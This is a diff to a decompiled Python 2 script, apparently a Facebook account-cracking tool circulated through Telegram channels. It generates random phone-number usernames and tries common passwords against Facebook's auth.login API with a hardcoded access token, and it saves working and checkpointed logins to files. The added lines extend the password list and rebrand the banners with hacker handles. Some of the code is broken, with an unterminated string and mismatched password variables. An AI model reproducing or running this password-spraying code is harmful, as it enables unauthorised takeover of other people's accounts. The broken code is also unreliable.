@@ -6,8 +6,8 @@
 # Embedded file name: dg
 import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
 os.system('rm -rf .txt')
-for n in range(100000):
-    nmbr = random.randint(1111111, 9999999)
+for n in range(10000):
+    nmbr = random.randint(111111, 999999)
     sys.stdout = open('.txt', 'a')
     print nmbr
     sys.stdout.flush()
@@ -55,10 +55,13 @@ def cb():
 
 
 logo =    '''\033[31;1m  
-KURD_TERMUX                                                            
+
+                                       
+                                                                
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
-\033[36;1mCODE BY : adnan
-\033[36;1mTELEGRAM CHANAL: https://t.me/crack_ackawnt
+\033[36;1mCODE BY : CRAK_ACCNT
+\033[36;1mTELEGRAM: @CRAK_ACCUNT
+\033[32;1mCHANNEL : https://t.me/Team_1666
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'''
 back = 0
 successful = []
@@ -72,7 +75,7 @@ def menu():
     print 42 * '\x1b[1;91m='
     print '\x1b[1;94m[1]\x1b[1;92m  KURDSTAN   \x1b[1;91m\xe2\x87\x8b  \x1b[1'
     print ' [0]\x1b[31;1m  DARCHUN            '
-    print '>>\x1b[1;92m  \x1b[1;91m(\x1b[1;97mV2\x1b[1;91m) '
+    print '>>\x1b[1;92m TOOL BY GWRGA KRAK1 (Gwrga) \x1b[1;91m(\x1b[1;97mV2\x1b[1;91m) '
     print 42 * '\x1b[1;91m='
     action()
 
@@ -126,17 +129,131 @@ def action():
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'access_token' in q:
-                print '\x1b[1;92m[successful]\x1b[1;95m ' + k + c + user + ' >>> ' + pass1 + '\n' + '\n'
+                print '\x1b[1;92m[HACK BY MARO]\x1b[1;92m ' + k + c + user + ' >>> ' + pass1 + '\n' + '\n'
                 okb = open('save/successfull.txt', 'a')
                 okb.write(k + c + user + '>>>' + pass1 + '\n')
                 okb.close()
                 oks.append(c + user + pass1)
             elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;93m[checkpoint]\x1b[1;96m ' + k + c + user + ' >>> ' + pass1 + '\n'
+                print '\x1b[1;91m[SAE HACK BY DARK]\x1b[1;91m ' + k + c + user + ' >>> ' + pass1 + '\n'
                 cps = open('save/checkpoint.txt', 'a')
                 cps.write(k + c + user + '>>>' + pass1 + '\n')
                 cps.close()
                 cpb.append(c + user + pass1)
+            else:
+                pass2 = '1234554321'
+            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+            q = json.load(data)
+            if 'access_token' in q:
+                print '\x1b[1;92m[SAE BY DARK]\x1b[1;92m ' + k + c + user + ' >>> ' + pass2 + '\n' + '\n'
+                okb = open('save/successfull.txt', 'a')
+                okb.write(k + c + user + '>>>' + pass2 + '\n')
+                okb.close()
+                oks.append(c + user + pass2)
+            elif 'www.facebook.com' in q['error_msg']:
+                print '\x1b[1;91m[SAE DARK HACK]\x1b[1;91m ' + k + c + user + ' >>> ' + pass2 + '\n'
+                cps = open('save/checkpoint.txt', 'a')
+                cps.write(k + c + user + '>>>' + pass2 + '\n')
+                cps.close()
+                cpb.append(c + user + pass2)
+            else:
+                pass3 = '1234512345'
+            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+            q = json.load(data)
+            if 'access_token' in q:
+                print '\x1b[1;92m[HACK BY DARK]\x1b[1;92m ' + k + c + user + ' >>> ' + pass3 + '\n' + '\n'
+                okb = open('save/successfull.txt', 'a')
+                okb.write(k + c + user + '>>>' + pass3 + '\n')
+                okb.close()
+                oks.append(c + user + pass3)
+            elif 'www.facebook.com' in q['error_msg']:
+                print '\x1b[1;91m[SAE HACK BY DARK]\x1b[1;91m ' + k + c + user + ' >>> ' + pass3 + '\n'
+                cps = open('save/checkpoint.txt', 'a')
+                cps.write(k + c + user + '>>>' + pass3 + '\n')
+                cps.close()
+                cpb.append(c + user + pass3)
+            else:
+                pass4 = '1122334455'
+            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+            q = json.load(data)
+            if 'access_token' in q:
+                print '\x1b[1;92m[SAE BY DARK]\x1b[1;92m ' + k + c + user + ' >>> ' + pass4 + '\n' + '\n'
+                okb = open('save/successfull.txt', 'a')
+                okb.write(k + c + user + '>>>' + pass4 + '\n')
+                okb.close()
+                oks.append(c + user + pass4)
+            elif 'www.facebook.com' in q['error_msg']:
+                print '\x1b[1;91m[NOT HACK]\x1b[1;91m ' + k + c + user + ' >>> ' + pass4 + '\n'
+                cps = open('save/checkpoint.txt', 'a')
+                cps.write(k + c + user + '>>>' + pass4 + '\n')
+                cps.close()
+                cpb.append(c + user + pass4)
+        except:
+            pass
+
+            pass5 = 'Muhamad123
+            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+            q = json.load(data)
+            if 'access_token' in q:
+                print '\x1b[1;92m[TM 1666]\x1b[1;92m ' + k + c + user + ' >>> ' + pass5 + '\n' + '\n'
+                okb = open('save/successfull.txt', 'a')
+                okb.write(k + c + user + '>>>' + pass5 + '\n')
+                okb.close()
+                oks.append(c + user + pass5)
+            elif 'www.facebook.com' in q['error_msg']:
+                print '\x1b[1;91m[TM 1666]\x1b[1;91m ' + k + c + user + ' >>> ' + pass5 + '\n'
+                cps = open('save/checkpoint.txt', 'a')
+                cps.write(k + c + user + '>>>' + pass5 + '\n')
+                cps.close()
+                cpb.append(c + user + pass5)
+            else:
+                pass6 = 'Ahmad1122334455'
+            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+            q = json.load(data)
+            if 'access_token' in q:
+                print '\x1b[1;92m[TM 1666]\x1b[1;92m ' + k + c + user + ' >>> ' + pass6 + '\n' + '\n'
+                okb = open('save/successfull.txt', 'a')
+                okb.write(k + c + user + '>>>' + pass6 + '\n')
+                okb.close()
+                oks.append(c + user + pass6)
+            elif 'www.facebook.com' in q['error_msg']:
+                print '\x1b[1;91m[TM 1666]\x1b[1;91m ' + k + c + user + ' >>> ' + pass6 + '\n'
+                cps = open('save/checkpoint.txt', 'a')
+                cps.write(k + c + user + '>>>' + pass6 + '\n')
+                cps.close()
+                cpb.append(c + user + pass6)
+            else:
+                pass7 = 'HAMA1122334455'
+            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+            q = json.load(data)
+            if 'access_token' in q:
+                print '\x1b[1;92m[TM 1666]\x1b[1;92m ' + k + c + user + ' >>> ' + pass7 + '\n' + '\n'
+                okb = open('save/successfull.txt', 'a')
+                okb.write(k + c + user + '>>>' + pass7 + '\n')
+                okb.close()
+                oks.append(c + user + pass7)
+            elif 'www.facebook.com' in q['error_msg']:
+                print '\x1b[1;91m[TM 1666]\x1b[1;91m ' + k + c + user + ' >>> ' + pass7 + '\n'
+                cps = open('save/checkpoint.txt', 'a')
+                cps.write(k + c + user + '>>>' + pass7 + '\n')
+                cps.close()
+                cpb.append(c + user + pass7)
+            else:
+                pass8 = '20012001'
+            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+            q = json.load(data)
+            if 'access_token' in q:
+                print '\x1b[1;92m[TM 1666]\x1b[1;92m ' + k + c + user + ' >>> ' + pass8 + '\n' + '\n'
+                okb = open('save/successfull.txt', 'a')
+                okb.write(k + c + user + '>>>' + pass8 + '\n')
+                okb.close()
+                oks.append(c + user + pass8)
+            elif 'www.facebook.com' in q['error_msg']:
+                print '\x1b[1;91m[NOT HACK]\x1b[1;91m ' + k + c + user + ' >>> ' + pass8 + '\n'
+                cps = open('save/checkpoint.txt', 'a')
+                cps.write(k + c + user + '>>>' + pass8 + '\n')
+                cps.close()
+                cpb.append(c + user + pass8)
         except:
             pass
 
